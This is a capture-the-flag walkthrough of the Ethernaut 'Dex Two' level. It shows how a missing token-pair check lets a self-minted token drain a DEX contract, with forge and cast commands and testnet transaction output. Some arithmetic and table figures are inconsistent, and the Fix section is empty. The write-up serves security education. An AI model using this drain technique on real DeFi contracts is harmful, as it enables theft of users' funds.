# Dex2

This level requires you to exploit the DexTwo contract, a subtly modified version of the previous Dex contract, in a different manner. Your goal is to drain all balances of token1 and token2 from the DexTwo contract to complete the level.

You begin with 10 tokens each of token1 and token2 and DexTwo contract initially holds 100 tokens each of token1 and token2.

## Vulnerability

We will notice a missing line:

```bash
require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
```

This line is responsible for validating that swapping is only allowed between the two token addresses defined by the contract. Since this requirement is absent in `DexTwo`, we are allowed to swap any tokens, including ones we create. This is the key to draining the`DexTwo` contract.

## Attack

| Dex Two |      |      |Player|      |      |
|---------|------|------|------|------|------|
| token1  |token2|  BTN |token1|token2|  BTN |
| 100     |  100 |  100 |   10 |   10 |  300 |
| 0       |  100 |  200 |  110 |   10 |  200 | swap(token1, BTN)
| 0       |    0 |  300 |  110 |  110 |  0   | swap(token2, BTN)

```bash
function getSwapAmount(address from, address to, uint256 amount) public view returns (uint256) {
    return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
}

# It calculates the amount of token2 that will be returned when x amount of BTN is swapped. The formula is rearranged to solve for x, which gives x = 200 BTN. This means that to get all 100 token2 from the Dex, 200 BTN need to be swapped.
# 100 = (x * 100)/200 (200 tokens were minted by the contract)
```

According to the formula in `get_swap_amount()`, to get all the token2 from the Dex2, we need `100 = (x * 100)/200 - x = 200 BTN`. Therefore, we need to swap 200 BTN to get 100 token2. Once this is done, here's how the final balance table will look:

1. Deploy `DeployDex2Attack.sol`.

```bash
forge script script/DeployDex2AttackToken.s.sol --rpc-url $ALCHEMY_RPC_URL --private-key $PRIVATE_KEY --broadcast --verify --etherscan-api-key $ETHERSCAN_API_KEY -vvvv --legacy

# https://sepolia.etherscan.io/address/0x659BFCd93A970941C49d54591A117d75042281A6

# At $CONTRACT_ADDRESS=0x659BFCd93A970941C49d54591A117d75042281A6
# balanceOf 0x64Dd9D94818A2CA2e95c31B084aeF0CC92e86dA2 = 400
```

2. Send 100 BTN from `Dex2AttackToken` to `Dex2`.

```bash
cast send $CONTRACT_ADDRESS "transfer(address,uint256)" $DEX2_ADDRESS 100 --rpc-url $ALCHEMY_RPC_URL --private-key $PRIVATE_KEY --legacy

# https://sepolia.etherscan.io/tx/0xaa361215bdf3f8756b8d9646da8a6eba68d36ed4ff9db451fa3f336effbbf209

# At $CONTRACT_ADDRESS=0x659BFCd93A970941C49d54591A117d75042281A6
# balanceOf 0x64Dd9D94818A2CA2e95c31B084aeF0CC92e86dA2 = 0

# At $DEX2_ADDRESS=0x4AEC8ebe30f5dBe4402549D998Ae9E2068860CCf
# balanceOF
# token address (BTN): 0x659BFCd93A970941C49d54591A117d75042281A6
# Dex2 contract address (DEX2_ADDRESS) : 0x4AEC8ebe30f5dBe4402549D998Ae9E2068860CCf
# equals 300
```

3. Approve `Dex2 address` to spend 300 BTN and enable it to perform the swap later.

```bash
cast send $CONTRACT_ADDRESS "approve(address,uint256)" $DEX2_ADDRESS 300 --private-key $PRIVATE_KEY --rpc-url $ALCHEMY_RPC_URL --legacy

# https://sepolia.etherscan.io/tx/0xa134cdb28083dc2ec49789336be65724241aacf9c095312ca60956d3e671717c
```

4. Execute the swap of both tokens.

```bash
forge script script/DeployDex2AttackSwap.s.sol --rpc-url $ALCHEMY_RPC_URL --private-key $PRIVATE_KEY --broadcast --verify --etherscan-api-key $ETHERSCAN_API_KEY -vvvv --legacy

# At $DEX2_ADDRESS=0x4AEC8ebe30f5dBe4402549D998Ae9E2068860CCf
# balanceOF
# token address (BTN): 0x659BFCd93A970941C49d54591A117d75042281A6
# Dex2 contract address (DEX2_ADDRESS) : 0x4AEC8ebe30f5dBe4402549D998Ae9E2068860CCf
# equals 300
```

## Fix
